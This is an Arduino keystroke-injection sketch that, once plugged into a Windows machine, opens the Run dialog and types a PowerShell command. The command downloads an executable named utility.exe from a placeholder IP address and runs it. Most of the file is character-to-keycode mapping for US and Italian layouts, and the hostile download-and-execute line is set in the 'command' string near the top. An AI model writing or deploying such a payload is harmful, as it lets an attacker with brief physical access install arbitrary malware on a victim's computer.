#include "Keyboard.h"

enum KeyboardLayout {
    LAYOUT_IT,
    LAYOUT_US
};

KeyboardLayout currentLayout = LAYOUT_US;  // <<< change here to LAYOUT_US or LAYOUT_IT
const char* command = "powershell mkdir C:/Temp -Force; iwr http://XXX.XXX.XXX.XXX/utility.exe -OutFile C:/Temp/utility.exe; Start-Process C:/Temp/utility.exe";

void pressKey(uint8_t key) {
    Keyboard.press(key);
    delay(2);
    Keyboard.release(key);
    delay(2);
}

void pressShiftKey(uint8_t key) {
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(key);
    delay(5);
    Keyboard.releaseAll();
    delay(5);
}

void pressAltGrKey(uint8_t key) {
    Keyboard.press(KEY_RIGHT_ALT);
    Keyboard.press(key);
    delay(5);
    Keyboard.releaseAll();
    delay(5);
}

void typeAlphaNum(char c) {
    if (c >= 'a' && c <= 'z') {
        pressKey(KEY_A + (c - 'a'));
    } else if (c >= 'A' && c <= 'Z') {
        pressShiftKey(KEY_A + (c - 'A'));
    } else if (c >= '0' && c <= '9') {
        switch(c) {
            case '0': pressKey(KEY_0); break;
            case '1': pressKey(KEY_1); break;
            case '2': pressKey(KEY_2); break;
            case '3': pressKey(KEY_3); break;
            case '4': pressKey(KEY_4); break;
            case '5': pressKey(KEY_5); break;
            case '6': pressKey(KEY_6); break;
            case '7': pressKey(KEY_7); break;
            case '8': pressKey(KEY_8); break;
            case '9': pressKey(KEY_9); break;
        }
    } else if (c == ' ') {
        pressKey(KEY_SPACE);
    }
}

void typeSymbol(char c) {
    switch(currentLayout) {
        // ===== IT =====
        case LAYOUT_IT:
            switch(c) {
                case '-': pressKey(KEY_SLASH); break;            
                case '_': pressShiftKey(KEY_SLASH); break;       
                case '\'': pressKey(KEY_MINUS); break;           
                case '?': pressShiftKey(KEY_MINUS); break;       
                case '.': pressKey(KEY_DOT); break;              
                case ':': pressShiftKey(KEY_DOT); break;         
                case ',': pressKey(KEY_COMMA); break;            
                case ';': pressShiftKey(KEY_COMMA); break;       
                case '@': pressAltGrKey(KEY_SEMICOLON); break;   
                case '\\': pressKey(KEY_GRAVE); break;           
                case '|': pressShiftKey(KEY_GRAVE); break;       
                case '+': pressKey(KEY_RIGHTBRACE); break;       
                case '*': pressShiftKey(KEY_RIGHTBRACE); break;  
                case ']': pressAltGrKey(KEY_RIGHTBRACE); break;  
                case '[': pressAltGrKey(KEY_LEFTBRACE); break;   
                case '!': pressShiftKey(KEY_1); break;           
                case '"': pressShiftKey(KEY_2); break;           
                case '$': pressShiftKey(KEY_4); break;           
                case '%': pressShiftKey(KEY_5); break;           
                case '&': pressShiftKey(KEY_6); break;           
                case '/': pressShiftKey(KEY_7); break;           
                case '(': pressShiftKey(KEY_8); break;           
                case ')': pressShiftKey(KEY_9); break;           
                case '=': pressShiftKey(KEY_0); break;           
            }
            break;

        // ===== US =====
        case LAYOUT_US:
            switch(c) {
                case '-': pressKey(KEY_MINUS); break;
                case '_': pressShiftKey(KEY_MINUS); break;
                case '/': pressKey(KEY_SLASH); break;
                case '?': pressShiftKey(KEY_SLASH); break;
                case '.': pressKey(KEY_DOT); break;
                case ':': pressShiftKey(KEY_SEMICOLON); break;
                case ',': pressKey(KEY_COMMA); break;
                case ';': pressKey(KEY_SEMICOLON); break;
                case '\\': pressKey(KEY_BACKSLASH); break;
                case '|': pressShiftKey(KEY_BACKSLASH); break;
                case '+': pressShiftKey(KEY_EQUAL); break;
                case ']': pressKey(KEY_RIGHTBRACE); break;
                case '[': pressKey(KEY_LEFTBRACE); break;
                case '=': pressKey(KEY_EQUAL); break;
                case '"': pressShiftKey(KEY_APOSTROPHE); break;
                case '\'': pressKey(KEY_APOSTROPHE); break;
                case '{': pressShiftKey(KEY_LEFTBRACE); break;
                case '}': pressShiftKey(KEY_RIGHTBRACE); break;                
                case '!': pressShiftKey(KEY_1); break;
                case '@': pressShiftKey(KEY_2); break;
                case '#': pressShiftKey(KEY_3); break;
                case '$': pressShiftKey(KEY_4); break;
                case '%': pressShiftKey(KEY_5); break;
                case '&': pressShiftKey(KEY_7); break;
                case '*': pressShiftKey(KEY_8); break;
                case '(': pressShiftKey(KEY_9); break;
                case ')': pressShiftKey(KEY_0); break;
            }
            break;
    }
}

void typeText(const char *text) {
    for(int i=0; text[i] != '\0'; i++) {
        char c = text[i];
        if ((c >= 'a' && c <= 'z') || 
            (c >= 'A' && c <= 'Z') || 
            (c >= '0' && c <= '9') || 
            c == ' ') {
            typeAlphaNum(c);
        } else {
            typeSymbol(c);
        }
    }
}

void setup() {
    delay(1000); // wait for USB

    // open Run dialog (Win+R)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(400);

    typeText(command);

    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
}

void loop() {
    // empty
}
